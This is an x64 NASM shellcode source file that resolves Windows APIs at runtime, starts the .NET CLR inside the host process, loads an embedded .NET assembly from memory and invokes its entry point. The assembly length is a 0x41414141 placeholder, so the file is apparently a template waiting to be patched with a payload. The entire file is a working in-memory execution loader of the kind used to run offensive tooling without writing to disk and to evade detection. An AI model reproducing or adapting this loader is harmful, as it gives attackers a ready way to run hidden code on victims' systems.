%include "sc-64-macros.asm"

%define RUNTIME_VERSION "v4.0.30319"

INDEX_KERNEL32_LOADLIBRARYA 			equ 0 * POINTERSIZE + STACKSPACE
INDEX_MSCOREE_CLRCREATEINSTANCE 		equ 1 * POINTERSIZE + STACKSPACE
INDEX_OLEAUT32_SAFEARRAYCREATE 			equ 2 * POINTERSIZE + STACKSPACE
INDEX_OLEAUT32_SAFEARRAYCREATEVECTOR 	equ 3 * POINTERSIZE + STACKSPACE
INDEX_OLEAUT32_SAFEARRAYACCESSDATA    	equ 4 * POINTERSIZE + STACKSPACE
INDEX_OLEAUT32_SAFEARRAYUNACCESSDATA  	equ 5 * POINTERSIZE + STACKSPACE
INDEX_OLEAUT32_VARIANTINIT 				equ 6 * POINTERSIZE + STACKSPACE

APIFUNCTIONCOUNT 				equ 7

struc SAFEARRAYBOUND
	.cElements resb 8
	.lLbound   resb 8
	.size:
endstruc

segment .text
	
	; setup environment, reserve stack space
	sub rsp, STACKSPACE + ROUND_EVEN(APIFUNCTIONCOUNT) * POINTERSIZE

	; resolve LoadLibraryA
	LOOKUP_API KERNEL32DLL, KERNEL32_LOADLIBRARYA, INDEX_KERNEL32_LOADLIBRARYA

	; load mscoree.dll
	lea rcx, [rel MSCOREEDLL]
	call [rsp + INDEX_KERNEL32_LOADLIBRARYA]

	; resolve CLRCreateInstance
	LOOKUP_API MSCOREEDLL, MSCOREE_CLRCREATEINSTANCE, INDEX_MSCOREE_CLRCREATEINSTANCE

	; load oleaut32.dll
	lea rcx, [rel OLEAUT32DLL]
	call [rsp + INDEX_KERNEL32_LOADLIBRARYA]

	; resolve oleaut32 functions
	LOOKUP_API OLEAUT32DLL, OLEAUT32_SAFEARRAYCREATE, INDEX_OLEAUT32_SAFEARRAYCREATE
	LOOKUP_API OLEAUT32DLL, OLEAUT32_SAFEARRAYCREATEVECTOR, INDEX_OLEAUT32_SAFEARRAYCREATEVECTOR
	LOOKUP_API OLEAUT32DLL, OLEAUT32_SAFEARRAYACCESSDATA, INDEX_OLEAUT32_SAFEARRAYACCESSDATA
	LOOKUP_API OLEAUT32DLL, OLEAUT32_SAFEARRAYUNACCESSDATA, INDEX_OLEAUT32_SAFEARRAYUNACCESSDATA
	LOOKUP_API OLEAUT32DLL, OLEAUT32_VARIANTINIT, INDEX_OLEAUT32_VARIANTINIT

	; CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, &pCLRMetaHost)
	lea r8, [rel CLRMETAHOST]
	lea rdx, [rel IID_ICLRMetaHost]
	lea rcx, [rel CLSID_CLRMETAHOST]
	call [rsp + INDEX_MSCOREE_CLRCREATEINSTANCE]
	test eax,eax
	jnz done

	; pCLRMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (void**)&pCLRRuntimeInfo)
	mov rax, [rel CLRMETAHOST]
	mov rax, [rax]
	lea r9, [rel CLRRUNTIMEINFO]
	lea r8, [rel IID_ICLRRUNTIMEINFO]
	lea rdx, [rel RUNTIME_VERSION_VALUE]
	mov rcx, [rel CLRMETAHOST]
	call [rax+0x18]
	test eax,eax
	jnz done

	; pCLRRuntimeInfo->GetInterface(CLSID_CorRuntimeHost,IID_ICorRuntimeHost, (void**)&pCorRuntimeHost)
	mov rax, [rel CLRRUNTIMEINFO]
	mov rax, [rax]
	lea r9, [rel CORRUNTIMEHOST]
	lea r8, [rel IID_ICORRUNTIMEHOST]
	lea rdx, [rel CLSID_CORRUNTIMEHOST]
	mov rcx, [rel CLRRUNTIMEINFO]
	call [rax+0x48]
	test eax,eax
	jnz done

	; pCorRuntimeHost->Start()
	mov rax, [rel CORRUNTIMEHOST]
	mov rax, [rax]
	mov rcx, [rel CORRUNTIMEHOST]
	call [rax+0x50]

	; pCorRuntimeHost->GetDefaultDomain(&pAppDomainThunk)
	mov rax, [rel CORRUNTIMEHOST]
	mov rax, [rax]
	lea rdx, [rel APPDOMAINTHUNK]
	mov rcx, [rel CORRUNTIMEHOST]
	call [rax+0x68]
	test eax,eax
	jnz done

	; pAppDomainThunk->QueryInterface(__uuidof(mscorlib::_AppDomain), (void**)&pAppDomain)
	mov rax, [rel APPDOMAINTHUNK]
	mov rax, [rax]
	lea r8, [rel APPDOMAIN]
	lea rdx, [rel CLSID_APPDOMAIN]
	mov rcx, [rel APPDOMAINTHUNK]
	call [rax]
	test eax,eax
	jnz done

	; safeArrayBound->cElements = ASSEMBLY_LENGTH;
	lea rsi, [rel sabSafeArray]
	mov [rsi+SAFEARRAYBOUND.cElements], dword ASSEMBLY_LENGTH

	; safeArrayBound->lLbound = 0
	mov [rsi+SAFEARRAYBOUND.lLbound], byte 0

	; pSafeArray = SafeArrayCreate(VT_UI1, 1, safeArrayBound);
	lea r8, [rel sabSafeArray]
	mov edx, 1
	mov cx, 0x11
	call [rsp + INDEX_OLEAUT32_SAFEARRAYCREATE]
	test eax,eax
	jz done
	mov [rel SAFEARRAY], rax

	; SafeArrayAccessData(pSafeArray, &lpSafeData)
	lea rdx, [rel SAFEARRAYDATA]
	mov rcx, [rel SAFEARRAY]
	call [rsp + INDEX_OLEAUT32_SAFEARRAYACCESSDATA]
	test eax,eax
	jnz done

	; memcpy(SAFEARRAYDATA, ASSEMBLY, ASSEMBLY_LENGTH)
	mov rsi, [rel SAFEARRAYDATA]
	mov rdi, rsi
	lea rsi, [rel ASSEMBLY]
	mov rcx, dword ASSEMBLY_LENGTH
	rep movsb

	; SafeArrayUnaccessData(pSafeArray)
	mov rcx, [rel SAFEARRAY]
	call [rsp + INDEX_OLEAUT32_SAFEARRAYUNACCESSDATA]
	test eax,eax
	jnz done

	; pAppDomain->Load_3(pSafeArray, &pAssembly)
	mov rax, [rel APPDOMAIN]
	mov rax, [rax]
	lea r8, [rel CORASSEMBLY]
	mov rdx, [rel SAFEARRAY]
	mov rcx, [rel APPDOMAIN]
	call [rax+0x168]
	test eax,eax
	jnz done

	; pMethodArgs = _SafeArrayCreateVector(VT_VARIANT, 0, 1);
	mov r8, 1
	xor rdx,rdx
	mov rcx, 0x0c
	call [rsp + INDEX_OLEAUT32_SAFEARRAYCREATEVECTOR]
	test eax,eax
	jz done
	mov [rel METHODARGS], rax

	; pAssembly->get_EntryPoint(&pMethodInfo)
	mov rax, [rel CORASSEMBLY]
	mov rax, [rax]
	lea rdx, [rel METHODINFO]
	mov rcx, [rel CORASSEMBLY]
	call [rax+0x80]
	test eax,eax
	jnz done

	; VariantInit(&obj)
	lea rcx, [rel VARIANTOBJ]
	call [rsp + INDEX_OLEAUT32_VARIANTINIT]

	; mMethodInfo->Invoke_3(obj, pMethodArgs, NULL);
	mov rax, [rel METHODINFO]
	mov rax, [rax]
	xor r9, r9
	mov r8, [rel METHODARGS]
	lea rdx, [rel VARIANTOBJ]
	mov rcx, [rel METHODINFO]
	call [rax+0x128]

	add rsp, STACKSPACE + ROUND_EVEN(APIFUNCTIONCOUNT) * POINTERSIZE
	ret

done:
	add rsp, STACKSPACE + ROUND_EVEN(APIFUNCTIONCOUNT) * POINTERSIZE
	ret

%include "sc-64-api-functions.asm"

CLSID_CLRMETAHOST:
db 0x8d,0x18,0x80,0x92,0x8e,0x0e,0x67,0x48,0xb3,0x0c,0x7f,0xa8,0x38,0x84,0xe8,0xde
IID_ICLRMetaHost:
db 0x9e,0xdb,0x32,0xd3,0xb3,0xb9,0x25,0x41,0x82,0x07,0xa1,0x48,0x84,0xf5,0x32,0x16
IID_ICLRRUNTIMEINFO:
db 0xd2,0xd1,0x39,0xbd,0x2f,0xba,0x6a,0x48,0x89,0xb0,0xb4,0xb0,0xcb,0x46,0x68,0x91
IID_ICORRUNTIMEHOST:
db 0x22,0x67,0x2f,0xcb,0x3a,0xab,0xd2,0x11,0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e
CLSID_CORRUNTIMEHOST:
db 0x23,0x67,0x2f,0xcb,0x3a,0xab,0xd2,0x11,0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e
CLSID_APPDOMAIN:
db 0xdc,0x96,0xf6,0x05,0x29,0x2b,0x63,0x36,0xad,0x8b,0xc4,0x38,0x9c,0xf2,0xa7,0x13

CLRMETAHOST 	dq 0x0000000000000000
CLRRUNTIMEINFO  dq 0x0000000000000000
CORRUNTIMEHOST  dq 0x0000000000000000
APPDOMAINTHUNK  dq 0x0000000000000000
APPDOMAIN 		dq 0x0000000000000000
SAFEARRAY 		dq 0x0000000000000000
SAFEARRAYDATA   dq 0x0000000000000000
CORASSEMBLY 	dq 0x0000000000000000
METHODARGS  	dq 0x0000000000000000
METHODINFO 		dq 0x0000000000000000
VARIANTOBJ 		dq 0x0000000000000000

RUNTIME_VERSION_VALUE:
	db __utf16__(RUNTIME_VERSION), 0, 0

sabSafeArray:  RESB SAFEARRAYBOUND.size

KERNEL32DLL 					db "KERNEL32.DLL", 0
KERNEL32_LOADLIBRARYA			db "LoadLibraryA", 0

MSCOREEDLL  					db "MSCOREE.DLL", 0
MSCOREE_CLRCREATEINSTANCE 		db "CLRCreateInstance", 0

OLEAUT32DLL 					db "OLEAUT32.DLL", 0
OLEAUT32_SAFEARRAYCREATE 		db "SafeArrayCreate", 0
OLEAUT32_SAFEARRAYCREATEVECTOR 	db "SafeArrayCreateVector", 0
OLEAUT32_SAFEARRAYACCESSDATA    db "SafeArrayAccessData", 0
OLEAUT32_SAFEARRAYUNACCESSDATA  db "SafeArrayUnaccessData", 0
OLEAUT32_VARIANTINIT 			db "VariantInit", 0

ASSEMBLY_LENGTH equ 1094795585
ASSEMBLY:
db 0x00